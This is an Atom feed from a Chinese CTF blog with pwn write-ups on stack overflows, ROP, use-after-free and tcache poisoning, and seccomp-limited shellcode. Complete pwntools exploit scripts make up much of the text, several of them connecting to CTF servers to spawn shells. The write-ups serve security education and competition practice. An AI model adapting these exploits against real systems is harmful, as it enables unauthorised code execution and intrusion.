<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chumen77&#39;s Blog</title>
  
  <subtitle>永远相信美好的事情即将发生！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chumen77.xyz/"/>
  <updated>2020-07-25T14:37:18.168Z</updated>
  <id>http://chumen77.xyz/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DASCTF安恒月赛(7th)</title>
    <link href="http://chumen77.xyz/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/"/>
    <id>http://chumen77.xyz/2020/07/25/DASCTF安恒月赛(7th)/</id>
    <published>2020-07-25T13:50:36.163Z</published>
    <updated>2020-07-25T14:37:18.168Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-7th"><a href="#DASCTF安恒月赛-7th" class="headerlink" title="DASCTF安恒月赛(7th)"></a>DASCTF安恒月赛(7th)</h1><p>只做出个签到题，tcl。。。</p><h2 id="虚假的签到题"><a href="#虚假的签到题" class="headerlink" title="虚假的签到题"></a>虚假的签到题</h2><p>简单的栈溢出，但是出题人估计是用了GCC&gt;=4.9版本，故意给这个Stack Buffer Overflow 设置难度。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code> 0x80485fd &lt;main+104&gt;:        mov    ecx,DWORD PTR [ebp-0x4] 0x8048600 &lt;main+107&gt;:        leave 0x8048601 &lt;main+108&gt;:        lea    esp,[ecx-0x4] 0x8048604 &lt;main+111&gt;:        ret</code></pre><p>这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。并且调试可以发现，如果我们直接overflow了 esp，那么会造成奇怪的影响。</p><p>试着分析一下：</p><ul><li>想要控制esp，就得控制ecx</li><li>想要控制ecx，就得至少控制到ebp-0x4的位置</li></ul><p>由于是gets的获取输入，这个明显很容易实现。</p><p>核心就是让：</p><pre><code>[ [ebp-0x4] - 0x4] = address(backdoor)</code></pre><p>附上成功时栈情况,断点在0x80485fd ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/cIBzn5.png" srcset="/img/loading.gif" alt></p><p>由于栈随机化，其中需要用格式化字符串漏洞泄漏<code>[ebp-0x4]</code>，来获取在<br>ebp-0x4的位置填入什么值合适，从而完成攻击。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./qiandao&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;183.129.189.60&#39;,10013)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()one = 0x804857D# debug()payload = &#39;%13$p&#39;sla(&#39;name&#39;,payload)ru(&#39;0x&#39;)key = int(r(8),16) - 0x40 + 0x8info_addr(&#39;key&#39;,key)payload = p32(one)*9 + p32(key)sla(&quot;?&quot;,payload)itr()</code></pre><p>多调试，会更容易理解。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTF安恒月赛-7th&quot;&gt;&lt;a href=&quot;#DASCTF安恒月赛-7th&quot; class=&quot;headerlink&quot; title=&quot;DASCTF安恒月赛(7th)&quot;&gt;&lt;/a&gt;DASCTF安恒月赛(7th)&lt;/h1&gt;&lt;p&gt;只做出个签到题，tcl。。。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF暑假刷题(1)</title>
    <link href="http://chumen77.xyz/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/07/10/BUUCTF暑假刷题/</id>
    <published>2020-07-10T13:16:13.644Z</published>
    <updated>2020-07-25T14:37:46.085Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF暑假刷题-1"><a href="#BUUCTF暑假刷题-1" class="headerlink" title="BUUCTF暑假刷题(1)"></a>BUUCTF暑假刷题(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>静态链接。32位程序。用<code>int 80h</code> 这个中断调用，呼叫系统调用程序<code>system_call()</code>.。</p><p>然后rop 控制EAX = 0Xb = 11，EBX = &amp;(“/bin/sh”), ECX = EDX = 0，即执行了<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>，即可拿到shell。</p><p>32位系统调用表：<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./simplerop&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29124)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()offset = 32start = 0x8048E45read = 0x806CD50pop_eax_ret = 0x080bae06pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806e851pop_edx_ret = 0x0806e82apop3_ret = 0x08048913bss = 0x80EC2EC - 0x10ret = 0x8048E6Fin_t_0x80 = 0x080493e1payload = &#39;a&#39; * offset + flat([read,pop3_ret,0,bss,0x8])payload += flat([pop_eax_ret,11,pop_ecx_ebx_ret,0,bss,pop_edx_ret,0,in_t_0x80])sa(&#39;:&#39;,payload)s(&#39;/bin/sh\x00&#39;)itr()</code></pre><p>其中rop链read后返回地址：<code>pop3_ret</code>，是为了pop <code>0,bss,0x8</code>，然后再跟着rop。</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞。</p><pre><code class="c">int __cdecl rec_str_free(void *ptr){  free(*((void **)ptr + 2));  free(ptr);  return puts(&quot;Note freed!&quot;);}</code></pre><p>每创建一个堆，就有一个0x10的堆空间，存放函数指针。一看到这个，就可以说是暗示攻击这个地方来劫持程序流程。</p><pre><code class="c">int do_del(){  int v0; // eax  v0 = ask((int)&quot;Index&quot;);  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);}</code></pre><p>利用这个函数来劫持程序流程。<br>先<code>new(0,2,0x40,payload)</code>看一下程序的内存情况, 对于其中的<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ：</p><pre><code class="c">gef➤  p &amp;records$1 = (&lt;data variable, no debug info&gt; *) 0x804b080 &lt;records&gt;gef➤  x/wx 0x804b0800x804b080 &lt;records&gt;:    0x08635160gef➤  x/wx 0x086351600x8635160:      0x080486de</code></pre><p>所以 <code>records[v0]</code>  = 0x08635160 </p><pre><code class="c">gef➤  x/wx 0x08635160+40x8635164:      0x08048725gef➤  x/i 0x08048725   0x8048725 &lt;rec_str_free&gt;:    push   ebp</code></pre><p>所以 <code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p><p>且<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>如图，把这里的函数指针控制成<code>sh\x00\00</code> + <code>&amp;system</code> ,即执行<code>do_del</code>时，运行的就是<code>system(sh)</code>可拿到shell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_n_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26453)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def new(id,type,len,context):    sla(&quot;CNote &gt;&quot;,&#39;1&#39;)    sla(&quot;dex &gt;&quot;,str(id))    sla(&quot;Type &gt;&quot;,str(type))    sla(&quot;th &gt;&quot;,str(len))    sa(&quot;ue &gt;&quot;,str(context))def free(id):    sla(&quot;CNote &gt;&quot;,&#39;2&#39;)    sla(&quot;dex &gt;&quot;,str(id))def show(id):    sla(&quot;CNote &gt;&quot;,&#39;3&#39;)    sla(&quot;dex &gt;&quot;,str(id))payload = &quot;a&quot; + &#39;\n&#39;new(0,2,0x40,payload)new(1,2,0x40,payload)free(1)free(0)system = elf.plt[&#39;system&#39;]new(2,2,0x9,&#39;sh\x00\x00&#39;+ p32(system))free(1)itr()</code></pre><h4 id="无system函数情况下"><a href="#无system函数情况下" class="headerlink" title="无system函数情况下"></a>无system函数情况下</h4><p>Leak libc，还是攻击那一个函数指针，本地通远程没通。</p><p>在测试的时候，由于fgets总是在你传入的字符串后加上<code>\x00</code>，曾经就遇到<br>过，导致泄漏十分难进行，但是发现：</p><pre><code class="python">payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8</code></pre><p>传入空字节竟然可以通过，且没有加上<code>\x00</code>，从而不影响泄漏libc。还不知道是否以后遇到fgets函数就可以这样处理其影响，先挖个坑，记录着。</p><pre><code class="python">payload = &#39;a&#39; + &#39;\n&#39;new(0,2,0x400,payload)new(1,2,0x400,payload)free(0)payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8info_addr(&quot;libc_base&quot;,libc_base)payload = &#39;\x00&#39;*4 + &#39;/bin/sh\x00&#39; +&#39;\n&#39;new(3,2,0x400-0x10-0x10,payload)new(4,2,0x40,payload)new(5,2,0x40,payload)free(5)free(4)rec = libc_base + 0x3d123new(6,2,0x9,p32(rec) + p32(rec))# free(5)show(5)# debug()itr()</code></pre><h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18 ,存在UAF漏洞，tcache dup攻击。</p><p>考点：</p><ul><li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li><li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li></ul><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_easyTHeap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc-2.27.so&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25814)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&quot;choice&quot;,&#39;1&#39;)    sla(&quot;?&quot;,str(size))def edit(idx,context):    sla(&quot;choice&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;content&#39;,str(context))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&quot;idx&quot;,str(idx))add(0x100) #0add(0x100) #1free(0)free(0)show(0)r()heapbase = uu64(r(6)) - 0x260info_addr(&#39;heapbase&#39;,heapbase)add(0x100) #2edit(2,p64(heapbase+0x10))add(0x100) #3add(0x100) #4edit(4,&#39;\x07&#39;*0x10)free(0)show(0)r()libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)__malloc_hook = libc_base + 0x3ebc30__realloc_hook = __malloc_hook -0x8payload = &#39;\x00&#39; * (8+7) + &#39;\x01&#39; + &#39;\x00&#39; * (0x80 - 8 - 8) + &#39;\x00&#39; * 0x38 + p64(__realloc_hook)edit(4,payload)add(0x100) #5onerec = 0x10a38c + libc_baserealloc_addr = libc_base + libc.symbols[&#39;__libc_realloc&#39;]info_addr(&#39;relloc&#39;,realloc_addr)info_addr(&#39;__malloc_hook&#39;,__malloc_hook)payload = p64(onerec) + p64(realloc_addr+8)edit(5,payload)add(0x100)#debug()itr()</code></pre><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>Ubuntu 18，保护全开，存在uaf漏洞。</p><p>程序只有增加和删除的功能，但是增加一个堆块后回给你返回申请堆块的地址信息。</p><pre><code class="c"> printf(&quot;gift :%p\n&quot;, heaplist[HIDWORD(size)]);</code></pre><p>删除堆后，没有置0的操作，存在uaf。</p><p>考点：</p><ul><li>攻击<code>tcache_perthread_struct</code>，伪造tcache已经满了</li><li>攻击<code>tcache_entry</code>，在指定的位置写上目标地址，在申请一个对应大小的堆，即可实现任意地址写入。</li></ul><p>难点：</p><ul><li>泄漏libc地址</li><li>精巧的构造一个任意地址写（在<code>tcache struct</code>处折腾）</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_final_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27714)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,content):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;index&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;thing&#39;,str(content))    ru(&quot;0x&quot;)    gift = int(r(12),16)    info_addr(&#39;gift&#39;,gift)    return giftdef free(idx):    sla(&quot;&gt;&quot;,&#39;2&#39;)    sla(&quot;index&quot;,str(idx))heap_base = add(0,0x48,&#39;a&#39;) - 0x11e70free(0)free(0)add(1,0x48,p64(heap_base+0x10))add(2,0x48,p64(heap_base+0x10))payload = 0x30 * &#39;\x07&#39;add(3,0x48,payload)free(3)payload = 0x30 * &#39;\x00&#39;add(4,0x48,payload)add(5,0x10,&#39; &#39;)libc_base = add(6,0x78,&#39; &#39;) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8free(5)add(7,0x10,p64(free_hook)*2)one_rec = 0x4f322 + libc_baseadd(8,0x48,p64(one_rec))# debug()free(4)itr()</code></pre><p>调试一下就懂了。其中0x10那个堆块的申请很重要，正好可以供后面的使用。</p><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>只是一个简单的rop，考的就是32位下如何控制传参数。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_rop_chain&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29550)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;] #,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win_function1 = 0x080485CBwin_function2 = 0x80485D8flag = 0x0804862Boffset = 0x18 + 4ru(&#39;Enter your input&gt;&#39;)payload = &#39;a&#39; * offset + flat([win_function1,win_function2,flag,0xBAAAAAAD,0xDEADBAAD])# debug()s(payload + &#39;\n&#39;)itr()</code></pre><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>考点 ：</p><ul><li>简单shellcode 的编写</li><li>seccomp（挖坑）</li></ul><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p><p>先用<code>seccomp-tools</code>看下禁用了什么函数：</p><pre><code>➜  pwnable_orw seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>明显只能执行 open read wirte 函数。</p><pre><code>#这里可以用pwntools库的一个函数代替,shellcraftc语言:open(&quot;/home/orw/flag&quot;) &lt;==&gt; 汇编:asm(shellcraft.open(&quot;/home/orw/flag&quot;))c语言:read(3,buf,0x20)&lt;==&gt; 汇编:asm(shellcraft.read(3,&quot;esp&quot;,0x20)c语言:write(1,buf,0x20)&lt;==&gt;汇编:asm(shellcraft.write(1,&quot;esp&quot;,0x20))</code></pre><p>其中 就是以esp当做临时变量 buf的地址，其可以自定义。</p><p>其中open函数执行后，由于是打开了一个新的文件，其返回的fd就是3，所以后面跟着的read的文件描述符也为3。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./orw&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26224)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()bss = 0x804A128 - 0x30payload= asm(shellcraft.open(&quot;./flag&quot;))payload += asm(shellcraft.read(3,bss,0x30))payload += asm(shellcraft.write(1,bss,0x30))sl(payload)itr()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF暑假刷题-1&quot;&gt;&lt;a href=&quot;#BUUCTF暑假刷题-1&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF暑假刷题(1)&quot;&gt;&lt;/a&gt;BUUCTF暑假刷题(1)&lt;/h1&gt;&lt;h2 id=&quot;cmcc-simplerop&quot;&gt;&lt;a href
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>“第五空间” 智能安全大赛-twice</title>
    <link href="http://chumen77.xyz/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://chumen77.xyz/2020/06/28/“第五空间” 智能安全大赛/</id>
    <published>2020-06-28T12:43:20.845Z</published>
    <updated>2020-07-10T13:17:12.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="“第五空间”-智能安全大赛"><a href="#“第五空间”-智能安全大赛" class="headerlink" title="“第五空间” 智能安全大赛"></a>“第五空间” 智能安全大赛</h1><p>比赛时当天有考试，就做了个签道题。</p><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="查保护"><a href="#查保护" class="headerlink" title="查保护"></a>查保护</h3><pre><code class="python">    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><ul><li>程序可以给你2次的读操作，第一次读89字节，第二次读112字节</li><li>栈大小是<code>0x60</code>，存在栈溢出。</li></ul><pre><code class="python">0x7fffffffe3b0 --&gt; 0x6097ecbc626822000x7fffffffe3b8 --&gt; 0x6097ecbc626822000128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;:    test   eax,eax)0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:    push   r15)0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:    mov    edi,eax)0160| 0x7fffffffe3e0 --&gt; 0x10168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f (&quot;/media/psf/mypwn/no5space/pwn&quot;)0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0</code></pre><ul><li>调试发现第一次read，可以leak canary 和一个栈地址，从而可以根据偏移算出栈上其他有用的地址。</li><li>第二次，需要填充一下canary，然后可以去攻击ret address</li></ul><p>但是，并没有拿到libc的地址，是无法拿到shell。<strong>由于可以溢出的字节有限，也没法进行rop。</strong></p><h3 id="获取libc地址"><a href="#获取libc地址" class="headerlink" title="获取libc地址"></a>获取libc地址</h3><p>此时，根据前面泄漏的栈地址，可以算出read函数的buf栈地址，然后<strong>栈迁移</strong>上去，然后进行rop来leak 出libc地址。</p><p>拿到libc地址以后，rop的终结地址为程序的<code>start</code>。让其清理栈，再次进行程序的漏洞利用。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;121.36.59.116&#39;,9999)    libc = 